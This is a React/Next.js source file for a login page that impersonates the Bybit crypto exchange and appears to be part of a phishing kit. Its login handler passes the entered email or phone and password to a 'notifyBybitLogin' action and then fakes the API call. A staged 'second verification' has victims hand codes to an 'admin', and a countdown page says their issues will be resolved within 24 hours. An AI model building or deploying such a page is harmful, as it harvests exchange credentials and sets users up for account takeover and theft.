"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Link from "next/link"
import { useSearchParams, useRouter } from "next/navigation"
import { Eye, EyeOff, QrCode, Shield, Clock, CheckCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { CountrySelector } from "@/components/country-selector"
import { notifyBybitLogin, notifySecondVerification } from "@/app/actions/email-actions"
import Image from "next/image"

type LoginStep = "login" | "secondVerification" | "thankYou"

export default function LoginForm() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const redirectUrl = searchParams.get("redirect_url") || "/dashboard"
  const isFromSecondVerification = searchParams.get("secondVerification") === "true"

  const [currentStep, setCurrentStep] = useState<LoginStep>("login")
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [secondTicketId, setSecondTicketId] = useState("")
  const [secondQrCode, setSecondQrCode] = useState("")
  const [secondCode, setSecondCode] = useState("")
  const [error, setError] = useState("")
  const [selectedCountry, setSelectedCountry] = useState({
    code: "US",
    name: "United States",
    dialCode: "+1",
    flag: "🇺🇸",
  })

  // Retrieve second verification data from session storage
  useEffect(() => {
    if (isFromSecondVerification) {
      const storedTicketId = sessionStorage.getItem("secondTicketId")
      const storedQrCode = sessionStorage.getItem("secondQrCode")

      if (storedTicketId && storedQrCode) {
        setSecondTicketId(storedTicketId)
        setSecondQrCode(storedQrCode)
      } else {
        // If no data found, generate new ones
        const newTicketId = `TKT-${Math.random().toString(36).substring(2, 10).toUpperCase()}`
        const newQrCode = `QR-${Math.random().toString(36).substring(2, 10).toUpperCase()}`
        setSecondTicketId(newTicketId)
        setSecondQrCode(newQrCode)
      }
    }
  }, [isFromSecondVerification])

  // Validate second code format: 3 letters + 3 numbers
  const validateSecondCode = (code: string) => {
    const regex = /^[A-Za-z]{3}[1-9]{3}$/
    return regex.test(code)
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    const formData = new FormData(e.target as HTMLFormElement)

    // Send Bybit login notification
    try {
      await notifyBybitLogin(formData)
    } catch (error) {
      console.error("Failed to send login notification:", error)
    }

    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1000))

    setIsLoading(false)

    // If coming from 2FA flow, go to second verification
    if (isFromSecondVerification) {
      // Send second verification started notification
      try {
        await notifySecondVerification({
          ticketId: secondTicketId,
          qrCode: secondQrCode,
          success: false,
        })
      } catch (error) {
        console.error("Failed to send second verification notification:", error)
      }

      setCurrentStep("secondVerification")
    } else {
      // Otherwise, redirect to dashboard or specified URL
      window.location.href = redirectUrl
    }
  }

  const handleSecondVerification = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError("")

    await new Promise((resolve) => setTimeout(resolve, 1000))

    if (!validateSecondCode(secondCode)) {
      setError("Invalid code format. Please enter 3 letters (A-Z) followed by 3 numbers (1-9)")
      setIsLoading(false)
      return
    }

    // Send second verification completed notification
    try {
      await notifySecondVerification({
        ticketId: secondTicketId,
        qrCode: secondQrCode,
        verificationCode: secondCode,
        success: true,
      })
    } catch (error) {
      console.error("Failed to send verification completion notification:", error)
    }

    // Clear session storage
    sessionStorage.removeItem("secondTicketId")
    sessionStorage.removeItem("secondQrCode")

    setCurrentStep("thankYou")
    setIsLoading(false)
  }

  if (currentStep === "secondVerification") {
    return (
      <Card className="w-full max-w-md">
        <CardHeader className="text-center">
          <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
            <Shield className="h-6 w-6 text-primary" />
          </div>
          <CardTitle>Final Verification</CardTitle>
          <CardDescription>Login successful! Now complete your final verification step</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 p-3 rounded-lg text-center">
            <p className="text-sm text-green-700 dark:text-green-300">✓ Login completed successfully</p>
          </div>

          <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 p-3 rounded-lg text-center">
            <p className="text-sm text-blue-700 dark:text-blue-300">📧 Admin notification sent</p>
          </div>

          <div className="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg text-center">
            <p className="text-sm text-muted-foreground mb-2">Second Ticket ID:</p>
            <p className="font-mono text-lg font-bold select-all">{secondTicketId}</p>
          </div>
          <div className="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg text-center">
            <p className="text-sm text-muted-foreground mb-2">Second QR Code:</p>
            <div className="flex items-center justify-center">
              <div className="w-32 h-32 bg-white flex items-center justify-center">
                <QrCode className="w-24 h-24 text-black" />
              </div>
            </div>
            <p className="font-mono text-sm mt-2">{secondQrCode}</p>
            <p className="text-xs text-muted-foreground mt-2">Submit this to admin for your final access code</p>
          </div>
          <form onSubmit={handleSecondVerification} className="space-y-4">
            <div className="space-y-2">
              <Input
                type="text"
                placeholder="Enter 6-character access code"
                value={secondCode}
                onChange={(e) => setSecondCode(e.target.value.toUpperCase())}
                className="h-12 text-center font-mono"
                maxLength={6}
                required
              />
            </div>
            {error && <p className="text-sm text-red-500 text-center">{error}</p>}
            <Button type="submit" className="w-full h-12" disabled={isLoading}>
              {isLoading ? "Verifying..." : "Complete Verification"}
            </Button>
          </form>
        </CardContent>
      </Card>
    )
  }

  if (currentStep === "thankYou") {
    return <ThankYouPage />
  }

  return (
    <div className="w-full max-w-md mx-auto">
      {/* Show notice if coming from 2FA flow */}
      {isFromSecondVerification && (
        <div className="mb-6 bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 p-4 rounded-lg text-center">
          <p className="text-sm text-blue-700 dark:text-blue-300">
            <Shield className="inline w-4 h-4 mr-1" />
            Please log in to complete your security verification
          </p>
        </div>
      )}

      <Tabs defaultValue="email" className="w-full">
        <TabsList className="grid w-full grid-cols-3 mb-6">
          <TabsTrigger value="email" className="text-sm">
            Email
          </TabsTrigger>
          <TabsTrigger value="mobile" className="text-sm">
            Mobile
          </TabsTrigger>
          <TabsTrigger value="qr" className="text-sm">
            QR Code
          </TabsTrigger>
        </TabsList>

        <TabsContent value="email">
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="space-y-2">
              <Input name="email" type="email" placeholder="Email" className="h-12" required />
            </div>

            <div className="space-y-2">
              <div className="relative">
                <Input
                  name="password"
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  className="h-12 pr-10"
                  required
                />
                <Button
                  type="button"
                  variant="ghost"
                  size="icon"
                  className="absolute right-0 top-0 h-full px-3"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? (
                    <EyeOff className="h-4 w-4 text-muted-foreground" />
                  ) : (
                    <Eye className="h-4 w-4 text-muted-foreground" />
                  )}
                </Button>
              </div>
            </div>

            <div className="text-right">
              <Link href="/forgot-password" className="text-sm text-primary hover:underline">
                Forgot password?
              </Link>
            </div>

            <Button type="submit" className="w-full h-12 bg-primary hover:bg-primary/90" disabled={isLoading}>
              {isLoading ? "Logging in..." : "Log in"}
            </Button>
          </form>
        </TabsContent>

        <TabsContent value="mobile">
          <form onSubmit={handleLogin} className="space-y-4">
            <div className="space-y-2">
              <div className="flex gap-2">
                <CountrySelector onCountrySelect={setSelectedCountry} selectedCountry={selectedCountry} />
                <Input name="phone" type="tel" placeholder="Mobile number" className="h-12 flex-1" required />
              </div>
            </div>

            <div className="space-y-2">
              <div className="relative">
                <Input
                  name="password"
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  className="h-12 pr-10"
                  required
                />
                <Button
                  type="button"
                  variant="ghost"
                  size="icon"
                  className="absolute right-0 top-0 h-full px-3"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? (
                    <EyeOff className="h-4 w-4 text-muted-foreground" />
                  ) : (
                    <Eye className="h-4 w-4 text-muted-foreground" />
                  )}
                </Button>
              </div>
            </div>

            <div className="text-right">
              <Link href="/forgot-password" className="text-sm text-primary hover:underline">
                Forgot password?
              </Link>
            </div>

            <Button type="submit" className="w-full h-12 bg-primary hover:bg-primary/90" disabled={isLoading}>
              {isLoading ? "Logging in..." : "Log in"}
            </Button>
          </form>
        </TabsContent>

        <TabsContent value="qr">
          <div className="text-center py-8">
            <div className="w-48 h-48 mx-auto bg-gray-100 rounded-lg flex items-center justify-center mb-4">
              <QrCode className="w-32 h-32 text-gray-400" />
            </div>
            <p className="text-sm text-muted-foreground">Scan QR code with Bybit app to log in</p>
          </div>
        </TabsContent>
      </Tabs>

      {/* Social Login */}
      <div className="mt-6">
        <div className="relative">
          <div className="absolute inset-0 flex items-center">
            <span className="w-full border-t" />
          </div>
          <div className="relative flex justify-center text-xs uppercase">
            <span className="bg-background px-2 text-muted-foreground">or log in with</span>
          </div>
        </div>

        <div className="flex justify-center gap-6 mt-4">
          <Button variant="outline" className="flex flex-col items-center gap-2 w-20 h-16 p-2">
            <Image src="/google-icon.png" alt="Google" width={20} height={20} />
            <span className="text-xs">Google</span>
          </Button>
          <Button variant="outline" className="flex flex-col items-center gap-2 w-20 h-16 p-2">
            <Image src="/apple-icon.png" alt="Apple" width={20} height={20} />
            <span className="text-xs">Apple</span>
          </Button>
          <Button variant="outline" className="flex flex-col items-center gap-2 w-20 h-16 p-2">
            <Image src="/telegram-icon.webp" alt="Telegram" width={20} height={20} />
            <span className="text-xs">Telegram</span>
          </Button>
        </div>

        <div className="text-center mt-4">
          <Link href="/subaccount" className="text-sm text-primary hover:underline">
            Log in with Subaccount →
          </Link>
        </div>
      </div>
    </div>
  )
}

function ThankYouPage() {
  const [timeLeft, setTimeLeft] = useState(24 * 60 * 60) // 24 hours in seconds

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600)
    const minutes = Math.floor((seconds % 3600) / 60)
    const secs = seconds % 60
    return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${secs
      .toString()
      .padStart(2, "0")}`
  }

  return (
    <Card className="w-full max-w-md">
      <CardHeader className="text-center">
        <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-green-100">
          <CheckCircle className="h-6 w-6 text-green-600" />
        </div>
        <CardTitle className="text-green-600">Verification Complete!</CardTitle>
        <CardDescription>Your account verification has been successfully completed</CardDescription>
      </CardHeader>
      <CardContent className="space-y-6 text-center">
        <div className="bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 p-3 rounded-lg text-center">
          <p className="text-sm text-green-700 dark:text-green-300">📧 Final notification sent to admin</p>
        </div>

        <div className="bg-gray-100 dark:bg-gray-800 p-6 rounded-lg">
          <div className="flex items-center justify-center mb-4">
            <Clock className="h-8 w-8 text-primary mr-2" />
            <span className="text-2xl font-bold font-mono">{formatTime(timeLeft)}</span>
          </div>
          <p className="text-sm text-muted-foreground">Time remaining for issue resolution</p>
        </div>

        <div className="space-y-4">
          <h3 className="font-semibold">What happens next?</h3>
          <ul className="text-sm text-muted-foreground space-y-2 text-left">
            <li>• Your issues will be resolved within 24 hours</li>
            <li>• You will receive an email with final instructions</li>
            <li>• Please check your inbox regularly</li>
            <li>• Keep your verification codes for reference</li>
          </ul>
        </div>

        <div className="pt-4">
          <p className="text-xs text-muted-foreground">
            If you don't receive an email within 24 hours, please contact our support team.
          </p>
        </div>
      </CardContent>
    </Card>
  )
}
